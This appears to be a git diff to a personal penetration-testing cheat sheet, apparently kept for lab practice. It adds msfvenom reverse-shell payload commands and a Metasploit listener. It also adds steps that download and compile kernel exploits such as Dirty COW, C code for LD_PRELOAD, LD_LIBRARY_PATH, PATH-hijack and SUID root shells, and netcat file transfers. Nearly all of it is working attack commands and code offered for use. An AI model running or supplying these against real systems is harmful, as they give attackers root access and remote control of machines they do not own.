@@ -250,6 +250,8 @@
 
 ### [Payloads, listeners, encoders and getting shells](#)
 
+**Payloads**
+
 - Msfvenom
     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f asp > shell.asp`
     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe`
@@ -258,15 +260,83 @@
 
 - x86/shikata_ga_nai 
     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe > payload.exe`
+
 - Command shell using ruby script
     - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`
 
-- Metasploit
-    - WinRM
-        - `use windows/winrm/winrm_script_exec` 
+- Manual Payloads
 
+    - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`
+
+    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`
+
+    - `nano exploit.c`
+        ```
+        #include <stdio.h>
+        #include <stdlib.h>
+        #include <sys/types.h>
+        void _init() {
+            unsetenv("LD_PRELOAD");
+            setuid(0);
+            setgid(0);
+            system("/bin/bash -p");
+            }   
+        ```
+        -  `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c` > `sudo LD_PRELOAD=./libncursesw.so.6 nano`
+
+        -  `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c` > `sudo LD_PRELOAD=./libncursesw.so.6 nano`
+
+    - `nano /tmp/preload.c`
+        ```
+        #include <stdio.h>
+        #include <sys/types.h>
+        #include <stdlib.h>
+
+        void _init() {
+                unsetenv("LD_PRELOAD");
+                setresuid(0,0,0);
+                system("/bin/bash -p");
+        }
+
+        ```
+        - `gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c` > `sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2`
+
+    - `ldd /usr/sbin/apache2` > `nano /home/user/tools/sudo/library_path.c`
+        ```
+        #include <stdio.h>
+        #include <sys/types.h>
+        #include <stdlib.h>
+
+        void _init() {
+                unsetenv("LD_LIBRARY_PATH");
+                setresuid(0,0,0);
+                system("/bin/bash -p");
+        }
+        ```
+        - `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c` > `sudo LD_LIBRARY_PATH=/tmp apache2`
+
+    - `echo $PATH` > `export PATH=/tmp:$PATH` > `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c` > `gcc /tmp/service.c -o /tmp/service` > `/usr/local/bin/suid-env`
+
+    `nano nfc.c`  
+        ```
+        #include<unistd.h>
+        void main (){
+        setuid(0);
+        setgid(0);
+        system("/bin/bash");
+        }
+        ```
+    - Complie the code to create executable and give SUID permission
+        - `gcc nfc.c -o nfs` > `chmod u+s nfs`
+
+
+**Listeners**
+
+- Metasploit 
     - Mulit/handler
         - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `run`
+
+**Injection of payload in executables**
 
 - Injection of payload in executables using `msfvenom`
 
@@ -286,6 +356,12 @@
 
 ### [Payload Transfer Techniques](#)
 
+- Using Netcat
+    - We need to have netcat listerner on target machine with `>` so whatever werecieve get stored in `'test.txt`
+        - `nc.exe -nlvp 1234 > test.txt`
+    - Sned file from your machine
+        - `nc -nv 10.5.19.93 1234 < test.txt`
+        
 - HTTP Server on kali
     - `service apache2 start`
     - `python -m SimpleHTTPServer 80`
